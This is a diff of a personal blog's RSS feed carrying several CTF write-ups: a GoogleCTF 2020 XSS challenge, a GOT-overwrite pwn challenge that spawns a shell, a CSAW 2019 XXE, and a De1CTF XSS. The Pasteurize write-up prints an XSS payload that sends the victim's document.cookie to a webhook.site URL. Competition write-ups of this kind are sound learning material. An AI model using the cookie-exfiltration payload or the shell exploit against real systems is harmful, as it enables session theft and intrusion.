@@ -16,10 +16,9 @@
             
             <guid>https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/</guid>
             <description>This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!
-(As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)
-Let&amp;rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function.</description>
+Let&amp;rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function. When you make a note, you have an option to share it with a &amp;ldquo;TjMike&amp;rdquo; Entity. Sign of XSS/CSRF attacks?
+ My input, &amp;ldquo;uwu&amp;rdquo;, is shoved into a javascript string variable called &amp;lsquo;note&amp;rsquo;.</description>
             <content type="html"><![CDATA[<p>This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!</p>
-<p>(As GoogleCTF 2020 ended on the day of this post, I will be omitting the flag from this article. I will update it once enough time has passed.)</p>
 <h2 id="lets-begin">Let&rsquo;s Begin!</h2>
 <p>The challenge lets us load into the DOM whatever we want through this pastebin-esque function.
 When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo; Entity. Sign of XSS/CSRF attacks?</p>
@@ -28,7 +27,7 @@ When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo;
 
 
 <em>My input, &ldquo;uwu&rdquo;, is shoved into a javascript string variable called &lsquo;note&rsquo;. Further down we see a</em> <code>const clean</code> <em>variable that calls DOMpurify to sanitize our input.</em></p>
-<p>Looking into the HTML, whatever content we put into the note is immediately shoved into a javascript string. However, if you try to input quotation marks in there, the DOMpurify clean function escapes it. So, if we can get an unescaped quote in there, we can do whatever want. Let&rsquo;s focus on the comment.</p>
+<p>Looking into the HTML, whatever content we put into the note is immediately shoved into a javascript string. However, if you try to input quotation marks in there, the DOMpurify clean function escapes it. So, if we can get an unescaped quote in there, we can do whatever we want. Let&rsquo;s focus on the comment.</p>
 
     <img src="/images/google2020source.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
 
@@ -63,6 +62,11 @@ When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo;
 <p>If we go to the page, we see that an alert is prompted - aka, we have succesfully escaped the JS string and can write javascript code as normal. That being said, let&rsquo;s go ahead and craft a payload to xss TJMike (I am being lazy and reusing an old payload of mine from before and modifying it).</p>
 <pre><code>content[]=; document.getElementById('note-content').onLoad = fetch('https://webhook.site/64627794-30a4-466d-b93a-537bdebca744', {method:'POST', body:JSON.stringify({data:document.cookie})});const uwu = 
 </code></pre><p>Share our note to TJMike. Wait for our server to grab their cookie.</p>
+
+    <img src="/images/googlectf2020pastflag.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Jam</p>
 ]]></content>
         </item>
         
@@ -83,7 +87,7 @@ When you make a note, you have an option to share it with a &ldquo;TjMike&rdquo;
 
 <p>We&rsquo;re allowed a single &lsquo;write&rsquo; privilege to change some aspect of the program. In pwn challenges, the goal would be to change the value in the instruction pointer - typically, common knowledge is to change the original value in the EIP register and have it take the address of the libc <code>system</code> function, allowing us to open a shell and do all sorts of things. We don&rsquo;t know where the libc location is through the global offset table, so figuring out the address of <code>system</code> will be our main issue.</p>
 <p>What&rsquo;s interesting is that the main() function returns by exit() - hence why we only get one write. However, if we use our one write to change exit() to instead jump back to main in the last line, we can bypass the &ldquo;one write only&rdquo; rule, sort of making our main() function recursive.</p>
-<p>Doing this, we actually get a <a href="https://www.gnu.org/software/libc/">libc</a> leak, through the function <code>alarm</code>. This is important - with this libc leak, we can solve our &ldquo;where is libc in the GOT&rdquo; question, and calculate the <code>system</code> function&rsquo;s address in memory through it.
+<p>Doing this, we actually get a <a href="https://www.gnu.org/software/libc/">libc</a> leak, through the function <code>alarm</code>. I find out afterwards that ASLR is disabled in this executable! This is important - with this libc leak, we can solve our &ldquo;where is libc in the GOT&rdquo; question, and calculate the <code>system</code> function&rsquo;s address in memory through it.
 So we now have an oppurtunity to call <code>system</code>, but what line should we replace in <code>main</code> to open our shell in?</p>
 <p>Lines 16 and 20 feature a libc function called <code>strtoull</code>. The nature of <code>strtoull</code>, according to the standard lib documentation, is to take its single argument (provided its a string) and convert it to a long unsigned int. Since it expects my input, we can take advantage of that fact and replace it with our <code>system</code> calls while feeding in <code>&quot;/bin/sh&quot;</code> as our input.
 We now have all the tools required to exploit this challenge.</p>
@@ -1453,7 +1457,7 @@ email: jam@jelly.com
 group: Fruit Preservatives
 intro: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag{n0w_i'm_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </code></pre><hr>
-<p>Looking back at CSAW 2019 now, it&rsquo;s almost obvious that the attack vector here was an XXE. Of course, being young and somewhat new to the collective CTF scene I wouldn&rsquo;t have figured this out from the get-go. It feels nice to know that I have grown and evolved as a CTF hacker, and I will continue to do so. Each CTF I participate in teaches me something new, and I will continue to grow and evolve as I participate in more CTFs. Hopefully if anyone reads this and feels uncertain about how much they don&rsquo;t know, spin it around and see it as an oppurtunity of how much you can learn :) Anyway, this was a quick writeup I did based on my year-old notes on this challenge, so I apologize for the lack of screenshots and otherwise simple presentation of it. This coming weekend, I will be participating in a few different CTFs, so expect more writeups to come soon!</p>
+<p>Looking back at CSAW 2019 now, it&rsquo;s almost obvious that the attack vector here was an XXE. Of course, being young and somewhat new to the collective CTF scene I wouldn&rsquo;t have figured this out from the get-go. It feels nice to know that I have grown and evolved as a CTF hacker, and I will continue to do so. While I got more serious early this year, each CTF I participate in teaches me something new, and I will continue to grow and evolve as I participate in more CTFs. Hopefully if anyone reads this and feels uncertain about how much they don&rsquo;t know, spin it around and see it as an oppurtunity of how much you can learn :) Anyway, this was a quick writeup I did based on my year-old notes on this challenge, so I apologize for the lack of screenshots and otherwise simple presentation of it. This coming weekend, I will be participating in a few different CTFs, so expect more writeups to come soon!</p>
 <p>Jam</p>
 <hr>
 <p>References</p>
@@ -1620,7 +1624,7 @@ But that&rsquo;s just part 1 of the problem: we&rsquo;ve sucessfully opened a sh
 </code></pre><p>And we retrieve the cookie, which has the flag:</p>
 <p><code>FLAG=De1CTF{I_l1k4_</code></p>
 <p>But this is just one half of the flag. Where&rsquo;s the other half?</p>
-<p>Eventually, De1CTF released a hint: &ldquo;what is the admin doing?&rdquo;</p>
+<p>Eventually, De1CTF released a hint: &ldquo;what is the admin doing?&quot;. After the CTF, I ruminated on the implications of this hint.</p>
 <p>Looking at the document shows hundreds of png images, of what looks like other people&rsquo;s passports. I guess, the other half of the flag is among them. But the hint got me thinking - obviously, the admin would have to be leafing through the screenshots but its not like the flag will just magically turn up in one of the images cause they forgot to hide their flag text file out of view. So unless I can control the screenshot, I doubt I&rsquo;ll be able to find the flag.</p>
 <p>The library &lsquo;<a href="https://html2canvas.hertzen.com/">html2canvas</a>&rsquo; comes to mind - taking screenshots with javascript. If I pass a payload to the admin that takes a screenshot of their interface, will the flag be there?</p>
 <p>The idea here is to upload some code using html2canvas. If we give it a .png extension the server won&rsquo;t complain, after which you can fetch your image back, whatever you called it, and evaluate it so it takes the screenshot and you can download it. Your code should import the html2canvas library, take a screenshot, then upload that screenshot to the server for you to fetch and download.</p>
